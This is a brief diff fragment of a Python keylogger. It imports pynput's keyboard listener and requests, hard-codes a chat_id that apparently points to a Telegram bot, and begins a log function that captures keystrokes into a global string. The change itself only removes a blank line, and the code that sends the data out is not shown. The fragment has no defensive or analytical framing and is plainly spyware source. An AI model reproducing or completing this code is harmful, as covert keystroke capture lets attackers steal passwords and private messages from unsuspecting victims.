@@ -7,7 +7,6 @@ chat_id = 921245059
 from pynput import keyboard
 import time, threading, requests
 
-
 data = ''
 def log(key): #capturing the keys and appending it into data
     global data
